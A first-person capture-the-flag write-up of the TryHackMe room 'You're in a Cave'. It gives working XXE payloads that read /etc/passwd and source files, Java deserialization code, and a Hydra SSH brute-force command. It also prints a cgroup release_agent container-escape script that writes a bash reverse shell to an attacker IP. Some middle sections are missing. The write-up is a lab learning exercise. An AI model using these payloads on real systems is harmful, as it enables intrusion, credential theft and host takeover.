## Overview

"You're in a Cave" is a hard-rated TryHackMe room with an RPG dungeon theme. The narrative follows a cave explorer encountering characters like a skeleton, an old man, and a door — each stage of the story corresponds to a real technical challenge. The room runs inside a Docker container, and the final objective is to escape that container and reach the host machine. There are two flags — one inside the container as root, and one on the host.
This was definitely the most challenging room so far. A week long grind requiring a lot of learning and evaluating in order to reach objectives!

**Attack chain:**
```
Recon → ffuf → Base64 encoded Java objects discovered
→ XXE injection via action.php → Read RPG.java source
→ Java deserialization RCE → Shell as cave
→ Regex wordlist generation → SSH brute force → Shell as door
→ GPG decryption → Environment variable abuse → Shell as skeleton
→ Symlink abuse → Modify root's init script → Root shell (container)
→ Docker detection → cgroup release_agent exploit → Root shell (host)
```

## 2. XXE Injection — Reading Server Files

Going back to the webpage hosted via the <TARGET_IP>. I intercepted the traffic when parsing my input using Burp Suite proxy. Skimming through the writeup, it hints towards `XXE`. I had no clue what XXE was! 

I referred myself to [Portswigger](https://portswigger.net/web-security/xxe), to familiarise myself on the topic. `XXE` is short for `XML External Entity`. XML is a coding language thats used to store and transfer data in a human readable but machine parseable format. This exploit involves — exploiting XML's parsing system. 

The key to the exploit is utilising an `Entity`. To be brief, this is a referrence to a resource. There are internal and external entities. Internal is data defined within the `Document type Definition`. External is also defined within the `DTD`, but the resource is retrived from outside the DTD. 

Thats what our goal is — To have our entity reference an external resource. Which is preferrably sensitive data that shouldn't be seen by an unauthorised user. 

![Burp Suite interception](/assets/images/writeups/in-a-cave/burp-intercept.png)

The `/action.php` endpoint accepted POST requests. The POST request is using the default `Content-Type` generated by HTML forms. Most sites expect requests in that format but accept other formats such as `XML`. Changing the `Content-Type` header in Burp Suite from `application/x-www-form-urlencoded` to `application/xml`, returns XML parsing errors — confirming the server was processing XML input.

![XML error reponse ](/assets/images/writeups/in-a-cave/xml-type.png)

  * The 400 status code again indicates a request syntax error. As its expecting xml tags indicated using `<>` *

We now know the application accepts XML content. We can now access the attack surface by reformatting our request to use the XML format. 
We can now create a payload that tries to retrieve the /etc/passwd file.

Crafted an XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<action>&xxe;</action>
```

![XXE payload returning /etc/passwd](/assets/images/writeups/in-a-cave/xml-passwd.png)

  *External entity successfully resolved — /etc/passwd returned in response*

This confirmed external entities and DTD loading were both enabled. I tried to access the action.php file the same way — though the server returned a 200 status code response, the body had no content. 

Both php and xml use angle bracket syntax. The xml parser will be confused when parsing the php source code, mistaking it for xml instructions. Reading the `action.php` source code via base64 wrapper will assist in avoiding XML parser conflicts with PHP tags:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/action.php">
```

![Viewing the base64 encoded php source code](/assets/images/writeups/in-a-cave/action.php.png)

Decoded the response:

```bash
echo "<base64response>" | base64 --decode
```

The source confirmed the vulnerability:

```php
libxml_disable_entity_loader(false);  // explicitly enables external entities
$dom->loadXML($data, LIBXML_NOENT | LIBXML_DTDLOAD);  // entities substituted
echo $xml;  // output reflected back
```

Basically most `xxe` vulnerabilities occur cause the `XML parser` supports potentailly dangerous features it doesn't need. `libxml_disable_entity_loader` is disabled, the `LIBXML_NOENT` substitutes entities and `LIBXML_DTDLOAD` loads the DTD — misconfiguraions required for XXE to work. The maker of this room had explicitly enabled them. Terrible web development practises XD!

Lastly, I used XXE to retrieve the `RPG.java` source code with base64 wrapper:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/cave/src/RPG.java">
```

## 3. Java Deserialization RCE — Shell as cave

```
RPG.java:

import java.util.*;
import java.io.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import org.apache.commons.io.IOUtils;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class RPG {

    private static final int port = 3333;
    private static Socket connectionSocket;

    private static InputStream is;
    private static OutputStream os;

    private static Scanner scanner;
    private static PrintWriter serverPrintOut;
    public static void main(String[] args) {
        try ( ServerSocket serverSocket = new ServerSocket(port)) {
            while (true) {
                connectionSocket = serverSocket.accept();

                is = connectionSocket.getInputStream();
                os = connectionSocket.getOutputStream();

                scanner = new Scanner(is, "UTF-8");
                serverPrintOut = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
                try {
                    serverPrintOut.println("You find yourself in a cave, what do you do?");
                    String s = scanner.nextLine();
                    URL url = new URL("http://cave.thm/" + s);
                    URLConnection con = url.openConnection();
                    InputStream in = con.getInputStream();
                    String encoding = con.getContentEncoding();
                    encoding = encoding == null ? "UTF-8" : encoding;
                    String string = IOUtils.toString(in, encoding);
                    string = string.replace("\n", "").replace("\r", "").replace(" ", "");
                    Action action = (Action) Serialize.fromString(string);
                    action.action();
                    serverPrintOut.println(action.output);
                } catch (Exception ex) {
                    serverPrintOut.println("Nothing happens");
                }
                connectionSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}

class Action implements Serializable {

    public final String name;
    public final String command;
    public String output = "";

    public Action(String name, String command) {
        this.name = name;
        this.command = command;
    }

    public void action() throws IOException, ClassNotFoundException {
        String s = null;
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo \"" + this.command + "\""
        };
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String result = "";
        while ((s = stdInput.readLine()) != null) {
            result += s + "\n";
        }
        this.output = result;
    }
}

class Serialize {

    /**
     * Read the object from Base64 string.
     */
    public static Object fromString(String s) throws IOException,
            ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(s);
        ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data));
        Object o = ois.readObject();
        ois.close();
        return o;
    }

    /**
     * Write the object to a Base64 string.
     */
    public static String toString(Serializable o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}
```

As someone who hasn't touched java since highschool. Utilising the writeup helped me thoroughly understand what the script was doing. Analysing `RPG.java` revealed the full attack chain. The service on port 3333:

1. Takes user input
2. Appends it to `http://cave.thm/` to form a URL
3. Fetches that URL from the web server
4. Base64 decodes the response
5. Deserializes it into a Java `Action` object
6. Calls `action.action()` which executes the shell command stored in the object's `command` field

  **Reminder:** The line of code `URL url = new URL("http://cave.thm/" + s);`. `cave.thm` is a host that should be inserted into the `/etc/hosts` file for 
    IP → hostname mapping.  

This meant by controlling what `action.php` returns — by making it serve a malicious serialized Java object — the command inside that object would execute on the server.

A modified version of the RPG.java script was used to generate a Base64 encoded serialized `Action` object with a reverse shell in the command field.
By replacing the main method in the `RPG.java` script with our reverse shell payload:

## 4. cave → door (Regex Wordlist + SSH Brute Force)

Refering back to the `macthes` base64 decoded data. We start of in the `/src`. If we traverse back one step:
```bash
cd ..
ls
```

Inside cave's home directory, `info.txt` described a wooden door without a keyhole, with random text carved on it representing the password:

```
^ed[h#f]{3}[123]{1,2}xf[!@#*]$
```

This is what we call a `Regular Expression → regex`. Refer to this [room](https://tryhackme.com/room/catregex) to learn more about it. **Warning:** If your just like me, learning about this concept whilst simultaneously doing this room — You could potentially fry your brain!

Breaking down the regex:

| Part | Meaning |
|---|---|
| `^ed` | Must start with `ed` |
| `[h#f]{3}` | Exactly 3 chars from h, #, or f |
| `[123]{1,2}` | One or two chars from 1, 2, or 3 |
| `xf` | Literal `xf` |
| `[!@#*]$` | Ends with one of !, @, #, * |

Utilising a python script called "[exrex.py](https://github.com/asciimoo/exrex/blob/master/exrex.py)" to generate every valid combination and saved them to a wordlist. 

```
python3 exrex.py -o wordlist '^ed[h#f]{3}[123]{1,2}xf[!@#*]$'
```

Then used Hydra to brute force SSH:

```bash
hydra -l door -P wordlist.txt ssh://<TARGET_IP> -s 2222
```

Output:
```
[2222][ssh] host: <TARGET_IP>   login: door   password: <here>
```
  *Hydra returns the correct password matching the regex pattern*

Using the brute forced password to log into the `door` user via ssh: 
```bash
ssh door@<TARGET_IP> -p 2222
```
  **Reminder:** The ssh service isn't listening on the default port. Don't make the same mistake I did — Lost in my querolousness trying to figure out why I           couldn't pick up a connection!

An infinite loop is listening out for connections. So in `/root/start.sh`. This line `su - cave -c "cd /home/cave/src; ./run.sh"` runs indefinitely, until we deliberately terminate the process.

we have to delete this specific process:
```
cave        <PID>  0.1  1.1 2375684 23456 ?       Sl   05:20   0:00 java -cp .:commons-io-2.7.jar RPG
```

We have sudo privileges to run the `/bin/kill` file as root — an executable command which sends signals to processes. Without the sudo privileges we wouldn't be able to terminate processes that aren't our own :
```bash
sudo /bin/kill -9 <PID>
```

The `-9` enables the `SIGKILL` process signal, which forces the specified process to stop by sending the process's resources to /dev/null. ## 8. Docker Container Escape (cgroup release_agent)

The room indicated a flag existed on the **host machine**. Used the cgroup `release_agent` exploit — the exploit only applies to cgroup v1.

**CGroup** is a Linux kernal feature that manages processes into hierarchial groups  — this ensures resource control. Now the cgroup v1 has a cleanup feature. A feature that is enabled when the last process exits. Two files control this — `release_agent` and `notify_on_release`. The Kernal resides outside the docker container. So when the kernal executes `release_agent`, it steps out the container with root-level access to the hosts filesystem.     

The steps:

```bash
# Mount a cgroup filesystem inside the container
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# Find container's path on the host filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Create the payload script on the host filesystem
echo "#!/bin/bash" > $host_path/exploit.sh
echo "bash -i >& /dev/tcp/<KALI_IP>/9002 0>&1" >> $host_path/exploit.sh
chmod +x $host_path/exploit.sh

# Set release_agent to our script
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent

# Trigger it
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Because the `release_agent` fires as **root on the host kernel** — not inside the container — the reverse shell connected back from the actual host machine.

```bash
# Attacker terminal
nc -lvnp 9002

root@host:~# cat /root/info.txt
THM{THIS_IS_NOT_THE_FLAG}
```

  *release_agent fires on the host kernel — shell received as host root*

## Key Takeaways

| Technique | Lesson |
|---|---|
| Base64 encoded Java objects | Decode and run `strings` on unknown binary data to reveal structure |
| XXE injection | `LIBXML_NOENT` + `LIBXML_DTDLOAD` + external entities = XXE. Always check Content-Type |

| Java deserialization RCE | If a service deserializes user-controlled data, you control what executes |
| URL encoding Base64 | Base64 special characters break URLs — always URL-encode before sending |
| Regex password generation | A regex pattern defines every valid password — `exrex.py` generates them all |
| GPG decryption | Private key + encrypted file = decrypted secret. Always check for `.gpg` and `.priv` files |
| Environment variable abuse | Binaries that check `$ENV_VAR` can be manipulated by exporting the expected value |
| Symlink abuse | Writing to a symlink writes to its target — world-writable directories containing symlinks to privileged files are dangerous |
| Docker detection | `/.dockerenv`, `/proc/self/cgroup`, and unusual PID 1 all indicate a container |
| cgroup release_agent escape | The release_agent fires on the host kernel — container boundaries don't apply |
